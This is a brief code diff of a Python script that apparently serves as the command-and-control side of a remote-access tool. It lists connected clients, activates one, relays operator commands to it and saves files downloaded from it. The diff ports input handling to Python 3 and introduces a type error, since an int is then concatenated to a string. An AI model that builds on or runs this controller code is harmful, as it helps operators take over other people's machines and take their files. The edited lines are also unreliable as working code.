@@ -50,7 +50,7 @@ while True:
     clients.append(str(a))
     refresh()
   except KeyboardInterrupt:
-    activate = input('Enter option: ')
+    activate = int(input('Enter option: '))
     
     Send(socks[activate], 'activate')
     pr('Activating client ' + activate)
@@ -76,7 +76,7 @@ while True:
       break
 
     sys.stdout.write(data)
-    nc = raw_input() # next cmd
+    nc = input() # next cmd
 
     if nc.startswith('download '):
       f = open(nc.split(' ')[1], 'wb')
